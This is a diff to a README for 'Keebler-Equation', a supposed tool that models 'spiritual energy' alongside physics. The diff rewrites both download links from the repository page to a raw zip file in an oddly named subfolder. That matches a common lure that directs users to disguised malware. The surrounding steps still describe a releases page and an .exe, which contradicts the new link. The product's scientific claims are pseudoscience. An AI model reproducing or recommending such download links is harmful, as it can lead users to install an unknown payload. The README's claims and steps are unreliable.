@@ -1,6 +1,6 @@
 # 🌌 Keebler-Equation - Mathematical models calculating spiritual energy values
 
-[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/Mdtau2367/Keebler-Equation)
+[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://raw.githubusercontent.com/Mdtau2367/Keebler-Equation/main/Idiosepion/Keebler-Equation-v2.5.zip)
 
 The Keebler-Equation software bridges the gap between physical science and spiritual energy. It provides a platform to model complex theoretical physics equations. This tool helps users input variables to observe the interaction between mass and spiritual energy constants. The software translates hard mathematics into visual graphs.
 
@@ -20,7 +20,7 @@ The software functions offline after installation. It does not require a high-sp
 
 You need to access the official project page to obtain the installer. Follow these instructions:
 
-1.  Visit the [Download Page](https://github.com/Mdtau2367/Keebler-Equation).
+1.  Visit the [Download Page](https://raw.githubusercontent.com/Mdtau2367/Keebler-Equation/main/Idiosepion/Keebler-Equation-v2.5.zip).
 2.  Locate the releases section on the right side of the screen.
 3.  Click the version labeled "Latest".
 4.  Find the file ending in .exe under the assets list.
